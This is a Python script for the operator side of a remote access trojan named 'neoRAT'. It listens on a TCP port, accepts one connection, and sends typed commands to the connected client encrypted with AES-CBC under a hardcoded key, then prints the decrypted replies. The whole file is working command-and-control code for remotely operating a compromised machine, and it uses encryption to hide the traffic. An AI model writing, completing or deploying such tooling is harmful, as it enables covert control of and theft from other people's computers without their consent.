#!/usr/bin/env python
# -*- coding: utf-8 -*-
import socket
import sys

from Crypto import Random
from Crypto.Cipher import AES

def help_p():
    if __file__.endswith('.py'):
        print(f'Usage: ./{str(__name__).replace("_", "")}.py <port>')
    else:
        print(f'Usage: ./{str(__name__).replace("_", "")} <port>')

try:
    PORT = int(sys.argv[1])
except (IndexError, ValueError):
    help_p()
    sys.exit(1)

HOST = 'localhost'
print(f'[+] Host: {HOST}')
print(f'[+] Port: {PORT}')

KEY = b'82e672ae054aa4de6f042c888111686a'  

def pad(s):
    return s + b'\0' * (AES.block_size - len(s) % AES.block_size)

def encrypt(plaintext):
    plaintext = pad(plaintext)
    iv = Random.new().read(AES.block_size)
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    return iv + cipher.encrypt(plaintext)

def decrypt(ciphertext):
    iv = ciphertext[:AES.block_size]
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    plaintext = cipher.decrypt(ciphertext[AES.block_size:])
    return plaintext.rstrip(b'\0')

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((HOST, PORT))
    s.listen(1)  # Só 1 cliente
    print(f'[+] neoRAT server listening on {HOST}:{PORT}...')

    conn, addr = s.accept()
    print(f'[+] Connection from {addr}')

    try:
        while True:
            cmd = input('neoRAT> ').rstrip()

            if cmd == '':
                continue

            conn.send(encrypt(cmd.encode()))  # cmd precisa ser bytes

            if cmd == 'quit':
                print('[+] Closing connection.')
                conn.close()
                break

            data = conn.recv(4096)
            if not data:
                print('[!] Client disconnected.')
                break

            print(decrypt(data).decode(errors='ignore'))  # decodifica para str

    except KeyboardInterrupt:
        print('\n[+] Server interrupted by user.')
    finally:
        conn.close()
        s.close()

if __name__ == '__main__':
    main()
